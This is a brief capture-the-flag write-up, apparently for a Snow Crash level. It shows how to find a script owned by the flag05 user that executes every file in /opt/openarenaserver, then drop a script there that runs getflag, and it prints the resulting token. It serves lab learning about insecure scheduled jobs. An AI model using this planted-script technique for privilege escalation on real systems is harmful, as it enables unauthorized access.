As previously done, we start by our usual commands:
```
ls -l # Empty
find / -user flag05 2>/dev/null # Checking the file owned by flag05
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

Looks like we found the place where we'll have to search

```
cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

cat /rofs/usr/sbin/openarenaserver # Permission denied
```
As we can see in the script, every file present in the folder seems to be launched.
So we'll just create a script there.

```
echo '/bin/getflag > /tmp/flag' > /opt/openarenaserver/script.sh
su flag05
Password: [Any Passwd]
su: Authentication failure
cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
